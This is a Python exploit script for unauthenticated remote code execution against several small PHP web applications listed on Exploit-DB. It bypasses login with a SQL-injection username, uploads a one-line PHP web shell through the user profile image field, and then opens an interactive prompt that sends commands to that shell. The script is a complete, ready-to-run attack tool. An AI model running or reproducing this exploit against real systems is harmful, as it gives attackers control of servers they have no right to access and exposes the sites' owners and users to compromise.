# This is Remote Code Execution (RCE) for some of applications from Exploit-DB:
# 1. Online Reviewer System 1.0 - Remote Code Execution (RCE) (Unauthenticated) - https://www.exploit-db.com/exploits/50319 - Abdullah Khawaja
# 2. Budget and Expense Tracker System 1.0 - Remote Code Execution (RCE) (Unauthenticated) - https://www.exploit-db.com/exploits/50308 - Abdullah Khawaja
# 3. Church Management System 1.0 - Remote Code Execution (RCE) (Unauthenticated) - https://www.exploit-db.com/exploits/50306 - Abdullah Khawaja
# 4. Online Food Ordering System 2.0 - Remote Code Execution (RCE) (Unauthenticated) - https://www.exploit-db.com/exploits/50305 - Abdullah Khawaja
# 5. Simple Chatbot Application 1.0 - Remote Code Execution (RCE) - https://www.exploit-db.com/exploits/50672 - Saud Alenazi
# etc....

#!/usr/bin/python3
from inspect import ArgSpec
from tempfile import gettempdir
from urllib import response
from webbrowser import get
import requests
import sys
import os
import urllib
import re
import datetime
import argparse

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

class Interface ():
    def __init__ (self):
        self.red = '\033[91m'
        self.green = '\033[92m'
        self.white = '\033[37m'
        self.yellow = '\033[93m'
        self.bold = '\033[1m'
        self.end = '\033[0m'

    def header(self):
        print('\n    >> Remote Code Execution(RCE)')
        print('    >> by twseptian\n')

    def info (self, message):
        print(f"[{self.white}*{self.end}] {message}")

    def warning (self, message):
        print(f"[{self.yellow}!{self.end}] {message}")

    def error (self, message):
        print(f"[{self.red}x{self.end}] {message}")

    def success (self, message):
        print(f"[{self.green}âœ“{self.end}] {self.bold}{message}{self.end}")

# Instantiate our interface class
global output
output = Interface()
output.header()

def bypass_login():
	global s
	global cookies
	s = requests.Session()
	data = {
        "username" : "+or+'1'%3D'1'%3B--+-", #bypass login
        "password" : "hahahaha", #
	}
	try:
		response = s.post(target_ip+"classes/Login.php?f=login",data=data,verify=False)
		output.success("Logged in successfully")
		cookies = response.cookies.get_dict()
	except requests.HTTPError as exception:
		output.error("HTTP Error : {}".format(exception))
		sys.exit(1)

def webshell(target_ip,session):
    try:
        WEB_SHELL = target_ip+'uploads/'+filename
        getdir = {'cmd': 'echo CMD'}
        r2 = session.get(WEB_SHELL, params=getdir, verify=False)
        status = r2.status_code
        if status != 200:
            output.error("Couldn't connect to the webshell")
            r2.raise_for_status()
        output.success("Successfully connected to webshell.")
        cwd = re.findall('[CDEF].*', r2.text)
        cwd = "\033[91m"+cwd[0]+"\033[0m> "
        term = cwd
        while True:
            thought = input(term)
            command = {'cmd': thought}
            r2 = requests.get(WEB_SHELL, params=command, verify=False)
            status = r2.status_code
            if status != 200:
                r2.raise_for_status()
            response2 = r2.text
            print(response2)
    except:
        print("\r\n"); output.warning("Existing.")
        sys.exit(-1)

# creating a php web shell
def create_phpshell():
    data_input = { 'id':'1', 'firstname':'Administrator', 'lastname':'Admin', 'username':'admin', 'password':''}
    phpshell = { 'img': ( 'shell.php', '<?php echo shell_exec($_REQUEST["cmd"]); ?>', 'application/octet-stream',{'Content-Disposition': 'form-data'})}
    return data_input,phpshell

def id_generator():
    x = datetime.datetime.now()
    date_string = x.strftime("%y-%m-%d %H:%M")
    date = datetime.datetime.strptime(date_string, "%y-%m-%d %H:%M")
    timestamp = datetime.datetime.timestamp(date)
    file = int(timestamp)
    final_name = str(file)+'_shell.php'
    return final_name

def upload_shell(target_ip):
    data_input,phpshell = create_phpshell()
    output.info("Uploading PHP Shell For RCE...")
    upload = s.post(target_ip+'classes/Users.php?f=save', cookies=cookies, files=phpshell, data=data_input)
    shell_upload = True if("1" in upload.text) else False
    if shell_upload:
        output.success("PHP Shell has been uploaded successfully!")
    else:
        output.error("Failed To Upload The PHP Shell!")

def get_args():
    parser = argparse.ArgumentParser(description='testing exploit')
    parser.add_argument('-t', '--target', dest="url", required=True, action='store', help='Target')
    args = parser.parse_args()
    return args
args = get_args()
target_ip = args.url

bypass_login()
filename = id_generator()
upload_shell(target_ip)#Uploading Reverse Shell
webshell(target_ip, s)#Executing The Webshell


